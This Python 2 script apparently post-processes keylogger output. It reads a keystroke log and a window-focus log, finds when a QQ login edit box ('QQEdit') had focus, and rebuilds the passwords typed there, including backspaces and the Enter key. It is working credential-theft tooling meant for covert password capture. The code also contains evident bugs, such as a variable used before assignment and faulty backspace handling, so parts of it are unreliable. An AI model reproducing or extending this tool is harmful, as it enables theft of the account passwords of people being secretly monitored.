# -*- coding: utf8 -*-
def int2str(num):
    if num >=0 and num <= 9:
        return '0' + str(num)
    else:
        return str(num)

def findpassword(data, texttime):
    result = []
    tempfile = open('c:/record_kernel.txt', 'r')
    tempdata = tempfile.readline()

    while tempdata:
        if tempdata.find(texttime) > 0:
            break
        tempdata = tempfile.readline()
    temp = tempfile.readline()
    flaga = 0
    flagb = 0
    n = 0
    m = 0
    while temp:
        if temp.find('--') < 0 and temp.find('new round') < 0 and temp.find('Time') < 0 and len(temp) > 2:
            if m == 2:
                break
            result.append(temp)
            flaga = 1
            n = 0
            tempfile.readline()
        elif len(temp)<=2 and flaga == 1:
            m = m + 1
            n = n + 1
            if n == 2:
                break
        temp = tempfile.readline()
    password = ''
    flag_enter = 0
    for r in result:
        li = r[0:-1].split(' ')
        for t in li:
            if len(t) == 1:
                if t >= '0' and t <= '9':
                    password = password + t
                elif t >= 'a' and t <= 'z':
                    password = password + t
                elif t >= 'A' and t <= 'Z':
                    password = password + t
            elif t == '[backspace]':
                if len(password) > 0:
                    password = password[0: -2]
            elif t == '[Enter]':
                flag_enter = 1
                break
            else:
                pass
        if flag_enter == 1:
            break
    return password
    tempfile.close()


def getpassword():
    filech = open("c:/EnableCH.txt", 'r')
    filerecord = open('c:/record_kernel.txt', 'r')
    data = filerecord.read()
    filerecord.close()
    total_password = []
    
    while 1:
        line = filech.readline()
        if not line:
            break
        location = line.find('QQEdit')
        if location < 0:
            continue
        location = line.find('Time: ')
        texttime = line[location + 6: -1]
        locationa = texttime.rfind(':') + 1
        seconds = texttime[locationa: locationa + 2]
        minutes = texttime[locationa - 3: locationa - 1]
        hours = texttime[locationa-6: locationa -4]

        if int(seconds) < 52:
            for count in range(8):
                if data.find(texttime) > 0:
                    total_password.append(findpassword(data, texttime))
                    break
                seconds = int2str(int(seconds) + 1)
                fr = texttime.rfind(':')
                texttime = texttime[0: fr] + ':' + seconds + '\n'
        else:
            for count in range(8):
                if data.find(texttime) > 0:
                    total_password.append(findpassword(data, texttime))
                    break
                if int(seconds) == 59:
                    seconds = '00'
                    if int(minutes) < 59:
                        print '<59'
                        minutes = int2str(int(minutes) + 1)
                        ar = texttime.rfind(':')
                        br = texttime.rfind(':',0,ar)
                        texttime = texttime[0: br] + ':' + minutes + ':' + seconds + '\n'
                    else:
                        print '00'
                        minutes = '00'
                        ar = texttime.rfind(':')
                        br = texttime.rfind(':',0,ar-1)
                        cr = texttime.rfind(':', 0, cr-1)
                        hours = int2str(int(hours) + 1)
                        texttime = texttime[0: cr] +':' + hours + ':' + minutes + ':' + seconds + '\n'
                else:
                    print 'second'
                    seconds = int2str(int(seconds) + 1)
                    fr = texttime.rfind(':')
                    texttime = texttime[0: fr] + ':' + seconds + '\n'

    filech.close()
    t_password =''
    for t in total_password:
        t_password  =  '\npassword:  ' + t + '\n'
    return t_password


   
